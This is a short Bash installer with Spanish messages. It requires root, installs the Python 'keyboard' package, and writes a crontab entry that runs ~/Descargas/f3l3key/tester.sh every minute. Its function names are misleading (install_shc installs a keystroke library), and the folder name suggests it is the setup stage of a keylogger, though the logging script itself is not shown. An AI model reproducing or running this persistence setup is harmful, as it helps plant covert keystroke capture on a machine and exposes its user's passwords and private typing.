#!/bin/bash

function is_root {
    if [[ $EUID -ne 0 ]]; then
        echo "Este script debe ser ejecutado como root"
        exit 1
    fi
}

function install_shc {
    sudo apt update -y
    sudo apt install python3-pip -y
    sudo pip3 install keyboard
}

function tarea_cron {
    sudo crontab -e
    echo -e "$(crontab -l)\n* * * * * bash ~/Descargas/f3l3key/tester.sh" | crontab -
    sudo service cron start
}

is_root
install_shc
tarea_cron
